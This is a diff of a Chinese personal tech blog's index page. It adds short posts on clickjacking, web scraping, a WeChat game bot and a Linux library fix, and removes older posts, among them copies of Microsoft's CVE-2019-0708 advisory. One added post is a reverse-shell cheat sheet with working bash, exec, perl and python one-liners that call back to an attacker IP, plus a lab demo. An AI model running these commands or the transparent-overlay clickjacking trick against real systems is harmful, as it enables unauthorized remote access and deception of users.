@@ -245,27 +245,315 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-e4-b8-80-e4-b8-aa-e7-82-b9-e5-87-bb-e5-8a-ab-e6-8c-81-e7-9a-84demo" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9-1/">python使用isoparser模块获取iso镜像文件内容</a>
+      <a class="article-title" href="/2018/04/27/e4-b8-80-e4-b8-aa-e7-82-b9-e5-87-bb-e5-8a-ab-e6-8c-81-e7-9a-84demo/">一个点击劫持的demo</a>
     </h1>
   
 
         
-        <a href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9-1/" class="archive-article-date">
-  	<time datetime="2019-08-07T07:03:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-07</time>
+        <a href="/2018/04/27/e4-b8-80-e4-b8-aa-e7-82-b9-e5-87-bb-e5-8a-ab-e6-8c-81-e7-9a-84demo/" class="archive-article-date">
+  	<time datetime="2018-04-27T09:51:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><code>import isoparser iso = isoparser.parse(&quot;路径&quot;) print iso.record(&quot;boot&quot;, &quot;grub&quot;).children #获取子路径内的文件目录 print iso.record(&quot;boot&quot;, &quot;grub&quot;, &quot;grub.cfg&quot;).content #获取文件内容</code> eg: <img src="http://112.74.49.123/wp-content/uploads/2019/08/iso%E5%BA%93.png" alt="获取kali镜像内的文件"></p>
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;style&gt;
+#father{
+position:relative;
+}
+#dj{
+position:absolute;
+top:0px;
+left:10px;
+height:100%;
+width:100%;
+z-index:10;
+left:0px;
+}
+#imgdiv{
+text-align:center;
+z-index:0;
+}
+&lt;/style&gt;
+&lt;script&gt;
+function fun(){
+window.open(&quot;https://www.baidu.com&quot;);
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;father&quot;&gt;
+&lt;div id=&quot;imgdiv&quot;&gt;
+&lt;img src=&quot;./timg.jpg&quot; alt=&quot;&quot;&gt;
+&lt;/div&gt;
+&lt;div id=&quot;dj&quot; onclick=&quot;fun()&quot;&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/html//" class="article-tag-list-link color5">html</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/27/e4-b8-80-e4-b8-aa-e7-82-b9-e5-87-bb-e5-8a-ab-e6-8c-81-e7-9a-84demo/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-e7-ae-80-e5-8d-95-e7-9a-84-e7-88-ac-e8-99-ab0x01-ef-bc-9a-e5-ae-9e-e7-8e-b0-e7-88-aci-e6-98-a5-e7-a7-8b-e7-9f-a5-e8-af-86-e4-bd-93-e7-b3-bb-e8-af-be-e7-a8-8b-e5-90-8d-e7-a7-b0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/15/e7-ae-80-e5-8d-95-e7-9a-84-e7-88-ac-e8-99-ab0x01-ef-bc-9a-e5-ae-9e-e7-8e-b0-e7-88-aci-e6-98-a5-e7-a7-8b-e7-9f-a5-e8-af-86-e4-bd-93-e7-b3-bb-e8-af-be-e7-a8-8b-e5-90-8d-e7-a7-b0/">简单的爬虫0x01：实现爬i春秋&#34;知识体系&#34;课程名称</a>
+    </h1>
+  
+
+        
+        <a href="/2018/04/15/e7-ae-80-e5-8d-95-e7-9a-84-e7-88-ac-e8-99-ab0x01-ef-bc-9a-e5-ae-9e-e7-8e-b0-e7-88-aci-e6-98-a5-e7-a7-8b-e7-9f-a5-e8-af-86-e4-bd-93-e7-b3-bb-e8-af-be-e7-a8-8b-e5-90-8d-e7-a7-b0/" class="archive-article-date">
+  	<time datetime="2018-04-15T02:05:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>以下为全部代码实现，python版本为3.6.4</p>
+<pre><code>#! coding=utf-8
+
+import requests
+import json
+import urllib
+
+def lesson(i):
+    url= &apos;https://www.ichunqiu.com/courses/ajaxCourses&apos;
+    header={
+            &apos;Host&apos;: &apos;www.ichunqiu.com&apos;,
+            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0&apos;,
+            &apos;Accept&apos;: &apos;application/json, text/javascript, */*; q=0.01&apos;,
+            &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;,
+            &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,
+            &apos;Referer&apos;: &apos;https://www.ichunqiu.com/courses&apos;,
+            &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,
+            &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,
+            &apos;Content-Length&apos;: &apos;102&apos;,
+            &apos;Connection&apos;: &apos;close&apos;,
+    }
+    data_post={&apos;courseTag&apos;:&apos;&apos;,&apos;courseDiffcuty&apos;:&apos;&apos;,&apos;IsExp&apos;:&apos;&apos;,&apos;producerId&apos;:&apos;&apos;,&apos;orderField&apos;:&apos;&apos;,&apos;orderDirection&apos;:&apos;&apos;,&apos;pageIndex&apos;:i,&apos;tagType&apos;:&apos;&apos;,&apos;isOpen&apos;:&apos;&apos;}
+    r=requests.post(url=url,headers=header,data=data_post)
+    data=json.loads(r.text)
+    #print(r.text)
+    #code = r.status_code
+    #print(code)
+    for name in data[&apos;course&apos;][&apos;result&apos;]:
+        print (name[&apos;courseName&apos;])
+
+for i in range(1,19):
+    lesson(i)</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/python程序设计//" class="article-tag-list-link color1">python程序设计</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/15/e7-ae-80-e5-8d-95-e7-9a-84-e7-88-ac-e8-99-ab0x01-ef-bc-9a-e5-ae-9e-e7-8e-b0-e7-88-aci-e6-98-a5-e7-a7-8b-e7-9f-a5-e8-af-86-e4-bd-93-e7-b3-bb-e8-af-be-e7-a8-8b-e5-90-8d-e7-a7-b0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-firefox-e4-bd-8e-e7-89-88-e6-9c-ac-ef-bc-88" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/02/16/firefox-e4-bd-8e-e7-89-88-e6-9c-ac-ef-bc-88/">Firefox低版本(慎点)</a>
+    </h1>
+  
+
+        
+        <a href="/2018/02/16/firefox-e4-bd-8e-e7-89-88-e6-9c-ac-ef-bc-88/" class="archive-article-date">
+  	<time datetime="2018-02-16T14:39:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="http://112.74.49.123/Firefox-DOS.html" target="_blank" rel="noopener">点击此链接（慎重！！！）</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/杂项//" class="article-tag-list-link color3">杂项</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/02/16/firefox-e4-bd-8e-e7-89-88-e6-9c-ac-ef-bc-88/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-e5-9f-ba-e4-ba-8epython-e7-9a-84wechat-e8-b7-b3-e4-b8-80-e8-b7-b3-e5-b0-8f-e6-b8-b8-e6-88-8f-e8-87-aa-e5-8a-a8-e5-8c-96-e5-be-97-e5-88-86" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/08/e5-9f-ba-e4-ba-8epython-e7-9a-84wechat-e8-b7-b3-e4-b8-80-e8-b7-b3-e5-b0-8f-e6-b8-b8-e6-88-8f-e8-87-aa-e5-8a-a8-e5-8c-96-e5-be-97-e5-88-86/">基于python的wechat跳一跳小游戏自动化得分</a>
+    </h1>
+  
+
+        
+        <a href="/2018/01/08/e5-9f-ba-e4-ba-8epython-e7-9a-84wechat-e8-b7-b3-e4-b8-80-e8-b7-b3-e5-b0-8f-e6-b8-b8-e6-88-8f-e8-87-aa-e5-8a-a8-e5-8c-96-e5-be-97-e5-88-86/" class="archive-article-date">
+  	<time datetime="2018-01-08T14:07:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前言： 近日，微信上推出了一款小程序，名为跳一跳，是通过按压屏幕时间长短控制跳跃力度，通过近一段时间对python的学习，我认为这款小游戏可以通过python取屏幕坐标值的方法进行自动化得分。 设计思路： 核心：每次落稳之后截图，根据截图算出棋子的坐标和下一个块顶面的中点坐标， 根据两个点的距离乘以一个时间系数获得长按的时间 识别棋子：靠棋子的颜色来识别位置，通过截图发现最下面一行大概是一条 直线，就从上往下一行一行遍历，比较颜色（颜色用了一个区间来比较） 找到最下面的那一行的所有点，然后求个中点，求好之后再让 Y 轴坐标 减小棋子底盘的一半高度从而得到中心点的坐标 识别棋盘：靠底色和方块的色差来做，从分数之下的位置开始，一行一行扫描， 由于圆形的块最顶上是一条线，方形的上面大概是一个点，所以就 用类似识别棋子的做法多识别了几个点求中点，这时候得到了块中点的 X 轴坐标，这时候假设现在棋子在当前块的中心，根据一个通过截图获取的 固定的角度来推出中点的 Y 坐标 最后：根据两点的坐标算距离乘以系数来获取长按时间（似乎可以直接用 X 轴距离） <a href="http://112.74.49.123/wp-content/uploads/2017/2018-1-8.mp4" target="_blank" rel="noopener">自动化功能实现录实</a> <a href="http://112.74.49.123/wp-content/uploads/2017/config.py" target="_blank" rel="noopener">用于获取手机分辨率</a> <a href="http://112.74.49.123/wp-content/uploads/2017/wechat_jump_auto.py" target="_blank" rel="noopener">自动化脚本</a></p>
 
       
 
@@ -289,7 +577,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9-1/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/01/08/e5-9f-ba-e4-ba-8epython-e7-9a-84wechat-e8-b7-b3-e4-b8-80-e8-b7-b3-e5-b0-8f-e6-b8-b8-e6-88-8f-e8-87-aa-e5-8a-a8-e5-8c-96-e5-be-97-e5-88-86/">展开全文 >></a>
         </p>
       
 
@@ -319,27 +607,32 @@
 
 
   
-    <article id="post-python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-e5-8f-8d-e5-bc-b9shell-e5-91-bd-e4-bb-a4" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/">python使用isoparser模块获取iso镜像文件内容</a>
+      <a class="article-title" href="/2017/12/12/e5-8f-8d-e5-bc-b9shell-e5-91-bd-e4-bb-a4/">反弹shell命令</a>
     </h1>
   
 
         
-        <a href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/" class="archive-article-date">
-  	<time datetime="2019-08-07T07:03:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-07</time>
+        <a href="/2017/12/12/e5-8f-8d-e5-bc-b9shell-e5-91-bd-e4-bb-a4/" class="archive-article-date">
+  	<time datetime="2017-12-12T11:40:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-12-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><code>import isoparser iso = isoparser.parse(&quot;路径&quot;) print iso.record(&quot;boot&quot;, &quot;grub&quot;).children #获取子路径内的文件目录 print iso.record(&quot;boot&quot;, &quot;grub&quot;, &quot;grub.cfg&quot;).content #获取文件内容</code> eg: <img src="http://112.74.49.123/wp-content/uploads/2019/08/iso%E5%BA%93.png" alt="获取kali镜像内的文件"></p>
+        <p>1.利用exec弹</p>
+<pre><code>exec 5&lt;&gt; /dev/tcp/攻击机ip/监听端口 0&gt;&amp;1
+     cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre><p>2.利用bash弹，在目标机器上执行</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/攻击机ip/监听端口 0&gt;&amp;1</code></pre><p>3.利用perl弹</p>
+<pre><code>perl -e &apos;use Socket;$i=&quot;攻击机ip&quot;;$p=监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>4.利用python弹</p>
+<pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击机ip&quot;,监听端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><p>测试环境：kali，Ubuntu-server 首先在Ubuntu-server服务器上开6666端口，等待连接： <img src="http://112.74.49.123/wp-content/uploads/2017/12/fantanshell1.jpg" alt=""> 肉鸡执行命令： <img src="http://112.74.49.123/wp-content/uploads/2017/12/fantanshell2.jpg" alt=""> 攻击机ip为192.168.56.101，端口号6666 获得shell： <img src="http://112.74.49.123/wp-content/uploads/2017/12/fantanshell3.jpg" alt=""></p>
 
       
 
@@ -354,7 +647,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/python程序设计//" class="article-tag-list-link color1">python程序设计</a>
+        			<a href="/categories/linux通用//" class="article-tag-list-link color3">linux通用</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/linux通用/代理//" class="article-tag-list-link color3">代理</a>
         		</li>
       		
 		</ul>
@@ -363,7 +660,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/07/python-e4-bd-bf-e7-94-a8isoparser-e6-a8-a1-e5-9d-97-e8-8e-b7-e5-8f-96iso-e9-95-9c-e5-83-8f-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b9/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/12/12/e5-8f-8d-e5-bc-b9shell-e5-91-bd-e4-bb-a4/">展开全文 >></a>
         </p>
       
 
@@ -393,27 +690,32 @@
 
 
   
-    <article id="post-prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-linux-e6-89-a7-e8-a1-8c-e5-8f-af-e6-89-a7-e8-a1-8c-e6-96-87-e4-bb-b6-e6-8f-90-e7-a4-bano-such-file-or-directory-e7-9a-84-e8-a7-a3-e5-86-b3-e6-96-b9-e6-b3-95" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-1/">Prevent a worm by updating Remote Desktop Services (CVE-2019-0708)</a>
+      <a class="article-title" href="/2017/11/22/linux-e6-89-a7-e8-a1-8c-e5-8f-af-e6-89-a7-e8-a1-8c-e6-96-87-e4-bb-b6-e6-8f-90-e7-a4-bano-such-file-or-directory-e7-9a-84-e8-a7-a3-e5-86-b3-e6-96-b9-e6-b3-95/">Linux执行可执行文件提示No such file or directory的解决方法</a>
     </h1>
   
 
         
-        <a href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-1/" class="archive-article-date">
-  	<time datetime="2019-05-15T01:54:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-15</time>
+        <a href="/2017/11/22/linux-e6-89-a7-e8-a1-8c-e5-8f-af-e6-89-a7-e8-a1-8c-e6-96-87-e4-bb-b6-e6-8f-90-e7-a4-bano-such-file-or-directory-e7-9a-84-e8-a7-a3-e5-86-b3-e6-96-b9-e6-b3-95/" class="archive-article-date">
+  	<time datetime="2017-11-22T07:04:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-22</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Today Microsoft released fixes for a critical Remote Code Execution vulnerability, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">CVE-2019-0708</a>, in Remote Desktop Services – formerly known as Terminal Services – that affects some older versions of Windows. The Remote Desktop Protocol (RDP) itself is not vulnerable. This vulnerability is pre-authentication and requires no user interaction. In other words, the vulnerability is ‘wormable’, meaning that any future malware that exploits this vulnerability could propagate from vulnerable computer to vulnerable computer in a similar way as the WannaCry malware spread across the globe in 2017. While we have observed no exploitation of this vulnerability, it is highly likely that malicious actors will write an exploit for this vulnerability and incorporate it into their malware. Now that I have your attention, it is important that affected systems are patched as quickly as possible to prevent such a scenario from happening. In response, we are taking the unusual step of providing a security update for all customers to protect Windows platforms, including some out-of-support versions of Windows. Vulnerable in-support systems include Windows 7, Windows Server 2008 R2, and Windows Server 2008. Downloads for in-support versions of Windows can be found in the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Microsoft Security Update Guide</a>. Customers who use an in-support version of Windows and have automatic updates enabled are automatically protected.  Out-of-support systems include Windows 2003 and Windows XP. If you are on an out-of-support version, the best way to address this vulnerability is to upgrade to the latest version of Windows. Even so, we are making fixes available for these out-of-support versions of Windows in <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">KB4500705</a>. Customers running Windows 8 and Windows 10 are not affected by this vulnerability, and it is no coincidence that later versions of Windows are unaffected. Microsoft invests heavily in strengthening the security of its products, often through major architectural improvements that are not possible to backport to earlier versions of Windows. There is partial mitigation on affected systems that have <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732713(v=ws.11)" target="_blank" rel="noopener">Network Level Authentication (NLA)</a> enabled. The affected systems are mitigated against ‘wormable’ malware or advanced malware threats that could exploit the vulnerability, as NLA requires authentication before the vulnerability can be triggered. However, affected systems are still vulnerable to Remote Code Execution (RCE) exploitation if the attacker has valid credentials that can be used to successfully authenticate. It is for these reasons that we strongly advise that all affected systems – irrespective of whether NLA is enabled or not – should be updated as soon as possible. Resources <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Links to downloads for Windows 7, Windows 2008 R2, and Windows 2008</a> <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">Links to downloads for Windows 2003 and Windows XP</a> Simon Pope, Director of Incident Response, Microsoft Security Response Center (MSRC) <strong>____</strong>分割线<strong><strong>__</strong></strong> 我只是个搬运工，别打我</p>
+        <p>最近在划水一个ctf比赛时，做到re的一道题目，在新装的Ubuntu-server 16.04.2上运行./re0，结果出现了No such file or directory。</p>
+<pre><code>./re0
+
+-bash: ./tshref: No such file or directory</code></pre><p>查看文件信息，可以看到文件是存在的，并且是可以执行的。</p>
+<pre><code>-rwxrwxrwx 1 root root 9712 Nov 17 20:50 re0</code></pre><p><img src="http://112.74.49.123/wp-content/uploads/2017/11/1-1.jpg" alt=""> 经过一番google，发现可能是系统位数与该可执行文件需要的lib库位数不匹配。 用uname命令打印系统信息，可以看到系统是64位系统 <img src="http://112.74.49.123/wp-content/uploads/2017/11/11.jpg" alt=""> 用file命令查看re0这个文件的信息</p>
+<pre><code>file ./re0</code></pre><p><img src="http://112.74.49.123/wp-content/uploads/2017/11/111.jpg" alt=""> 可以看到这是一个32位可执行文件。 要想在64位系统上与运行32位程序，则需要安装32位lib库。 于是，安装就好 <img src="http://112.74.49.123/wp-content/uploads/2017/11/1111.jpg" alt=""> 没找到google上说的需要的库，但是会有几个替代包，选择安装其中一个。 apt-get install lib32z1 <img src="http://112.74.49.123/wp-content/uploads/2017/11/qweqweqe.jpg" alt=""> 然后就可以正常运行之前的可执行文件了。</p>
 
       
 
@@ -428,7 +730,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/威胁情报//" class="article-tag-list-link color5">威胁情报</a>
+        			<a href="/categories/linux通用//" class="article-tag-list-link color3">linux通用</a>
         		</li>
       		
 		</ul>
@@ -437,7 +739,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-1/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/11/22/linux-e6-89-a7-e8-a1-8c-e5-8f-af-e6-89-a7-e8-a1-8c-e6-96-87-e4-bb-b6-e6-8f-90-e7-a4-bano-such-file-or-directory-e7-9a-84-e8-a7-a3-e5-86-b3-e6-96-b9-e6-b3-95/">展开全文 >></a>
         </p>
       
 
@@ -467,27 +769,27 @@
 
 
   
-    <article id="post-prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e8-a3-85vnc" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-2/">Prevent a worm by updating Remote Desktop Services (CVE-2019-0708)</a>
+      <a class="article-title" href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e8-a3-85vnc/">树莓派Ubuntu-mate装vnc</a>
     </h1>
   
 
         
-        <a href="/2019/05/15/prevent-a-worm-by-updating-remote-desktop-services-cve-2019-0708-2/" class="archive-article-date">
-  	<time datetime="2019-05-15T01:54:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-15</time>
+        <a href="/2017/11/21/e6-a0-91-e8-8e-93-e6-b4-beubuntu-mate-e8-a3-85vnc/" class="archive-article-date">
+  	<time datetime="2017-11-21T08:55:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Today Microsoft released fixes for a critical Remote Code Execution vulnerability, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">CVE-2019-0708</a>, in Remote Desktop Services – formerly known as Terminal Services – that affects some older versions of Windows. The Remote Desktop Protocol (RDP) itself is not vulnerable. This vulnerability is pre-authentication and requires no user interaction. In other words, the vulnerability is ‘wormable’, meaning that any future malware that exploits this vulnerability could propagate from vulnerable computer to vulnerable computer in a similar way as the WannaCry malware spread across the globe in 2017. While we have observed no exploitation of this vulnerability, it is highly likely that malicious actors will write an exploit for this vulnerability and incorporate it into their malware. Now that I have your attention, it is important that affected systems are patched as quickly as possible to prevent such a scenario from happening. In response, we are taking the unusual step of providing a security update for all customers to protect Windows platforms, including some out-of-support versions of Windows. Vulnerable in-support systems include Windows 7, Windows Server 2008 R2, and Windows Server 2008. Downloads for in-support versions of Windows can be found in the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Microsoft Security Update Guide</a>. Customers who use an in-support version of Windows and have automatic updates enabled are automatically protected.  Out-of-support systems include Windows 2003 and Windows XP. If you are on an out-of-support version, the best way to address this vulnerability is to upgrade to the latest version of Windows. Even so, we are making fixes available for these out-of-support versions of Windows in <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">KB4500705</a>. Customers running Windows 8 and Windows 10 are not affected by this vulnerability, and it is no coincidence that later versions of Windows are unaffected. Microsoft invests heavily in strengthening the security of its products, often through major architectural improvements that are not possible to backport to earlier versions of Windows. There is partial mitigation on affected systems that have <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732713(v=ws.11)" target="_blank" rel="noopener">Network Level Authentication (NLA)</a> enabled. The affected systems are mitigated against ‘wormable’ malware or advanced malware threats that could exploit the vulnerability, as NLA requires authentication before the vulnerability can be triggered. However, affected systems are still vulnerable to Remote Code Execution (RCE) exploitation if the attacker has valid credentials that can be used to successfully authenticate. It is for these reasons that we strongly advise that all affected systems – irrespective of whether NLA is enabled or not – should be updated as soon as possible. Resources <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">Links to downloads for Windows 7, Windows 2008 R2, and Windows 2008</a> <a href="https://support.microsoft.com/help/4500705" target="_blank" rel="noopener">Links to downloads for Windows 2003 and Windows XP</a> Simon Pope, Director of Incident Response, Microsoft Security Response Center (MSRC) <strong>____</strong>分割线<strong><strong>__</strong></strong> 我只是个搬运工，别打我</p>
